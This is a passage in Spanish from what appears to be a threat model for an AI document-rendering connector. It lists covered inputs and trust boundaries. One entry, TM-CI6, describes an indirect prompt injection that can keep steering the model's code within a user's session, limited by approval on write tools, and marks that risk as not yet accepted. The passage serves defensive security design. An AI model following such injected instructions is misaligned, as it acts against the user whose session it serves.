- **TM-CI6:** una inyección indirecta puede seguir dirigiendo el código dentro de la sesión de la persona; el daño queda dentro de esa conversación y sin escritura fuera (las tools de escritura siguen exigiendo aprobación, D56). No entró en el menú de aceptación del 2026-11-07: **sin aceptar todavía**.

## Quality check

- Entradas cubiertas: las tres tools del conector, `render_document`, hidratación, helpers, bloque en la web.
- Fronteras representadas: modelo → Gateway (CI2, CI6), Gateway → conector (CI2), conector → sandbox (CI1, CI9), sandbox → red (CI3), conector → S3 (CI4), trabajador → navegador (CI5), release → sandbox (CI12), render (CI8).
- Runtime frente a CI: la imagen de `render-document` se construye en el CI de la release (D58); nada se construye en la cuenta del cliente (regla 1).
